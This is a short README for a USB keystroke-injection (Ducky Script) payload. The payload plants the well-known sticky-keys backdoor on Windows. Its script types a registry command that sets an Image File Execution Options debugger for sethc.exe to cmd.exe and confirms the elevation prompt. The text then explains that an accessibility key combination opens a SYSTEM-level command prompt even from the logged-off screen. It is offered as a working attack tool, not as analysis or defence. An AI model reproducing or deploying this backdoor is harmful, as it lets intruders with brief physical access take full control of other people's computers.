# DISCLAIMER
***
This command prompt will close automatically due to the way this hack works (after about 3 minutes or so)  
This hack does require pre work and does require administrator privileges to modify the registry.  

### Pre work
```
DELAY 400
ESCAPE
DELAY 200
CONTROL ESCAPE
DELAY 750
STRING cmd.exe /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f"
DELAY 750
CTRL-SHIFT ENTER
DELAY 1000
ALT y
```
 
Left Alt + Left Shift + Print Screen to access the prompt.
Ok so that's the pre work done now when the users machine is logged off and you want to be able to execute commands or even if you just want to be able to execute commands as the system not as administrator all you need to do is press  
 Left Alt + Left Shift + Print Screen.  